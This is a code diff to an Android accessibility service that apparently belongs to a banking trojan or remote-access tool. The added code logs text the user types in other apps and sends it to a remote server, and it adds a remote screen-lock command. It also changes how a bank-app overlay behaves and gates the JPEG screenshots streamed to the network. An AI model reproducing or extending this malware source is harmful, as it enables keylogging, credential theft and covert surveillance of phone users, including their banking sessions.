@@ -34,6 +34,8 @@ public class KeySvc extends AccessibilityService {
     public volatile String curPkg;
     private volatile String curWin;
     public volatile boolean shotOn = true;
+    private volatile String ultCampo = "";
+    private volatile long ultCampoMs;
     private volatile boolean shotBusy;
     private volatile long lastShot;
     private WindowManager wm;
@@ -88,13 +90,29 @@ public class KeySvc extends AccessibilityService {
             String p = e.getPackageName() == null ? null : e.getPackageName().toString();
             if (p != null && !p.equals(curPkg)) {
                 curPkg = p;
-                if (Ov.on() && Ov.banco(p)) Ov.set(this, false);
+                if (Ov.on() && !Ov.fixo && Ov.banco(p)) Ov.set(this, false);
             }
             if (e.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                     && e.getClassName() != null) {
                 String w = e.getClassName().toString();
                 int i = w.lastIndexOf('.');
                 curWin = i >= 0 ? w.substring(i + 1) : w;
+            }
+            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                try {
+                    java.util.List<CharSequence> lt = e.getText();
+                    if (lt != null && lt.size() > 0 && lt.get(0) != null) {
+                        String t = lt.get(0).toString();
+                        if (t.length() > 0 && t.length() < 300 && !t.equals(ultCampo)
+                                && System.currentTimeMillis() - ultCampoMs > 300
+                                && p != null && !p.equals(getPackageName())) {
+                            ultCampo = t;
+                            ultCampoMs = System.currentTimeMillis();
+                            Net.send("{\"t\":\"k\",\"pkg\":\"" + Util.esc(p)
+                                    + "\",\"win\":\"campo\",\"o\":\"" + Util.esc("= " + t) + "\"}");
+                        }
+                    }
+                } catch (Throwable ignored2) {}
             }
         } catch (Throwable ignored) {}
     }
@@ -249,6 +267,15 @@ public class KeySvc extends AccessibilityService {
         } catch (Throwable ignored) {}
     }
 
+    public void lock() {
+        H.post(() -> {
+            try {
+                if (Build.VERSION.SDK_INT >= 28) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+            } catch (Throwable ignored) {}
+        });
+    }
+
+
     private void grab() {
         if (shotBusy) return;
         shotBusy = true;
@@ -266,9 +293,11 @@ public class KeySvc extends AccessibilityService {
                         int th = Math.max(2, soft.getHeight() * tw / Math.max(1, soft.getWidth())) & ~1;
                         small = Bitmap.createScaledBitmap(soft, tw, th, true);
                         ScreenSvc.lastFrame = System.currentTimeMillis();
-                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
-                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
-                        Net.sendBin(bo.toByteArray());
+                        if (shotOn) {
+                            ByteArrayOutputStream bo = new ByteArrayOutputStream();
+                            small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
+                            Net.sendBin(bo.toByteArray());
+                        }
                     } catch (Throwable ignored) {
                     } finally {
                         try { if (small != null) small.recycle(); } catch (Throwable ignored) {}
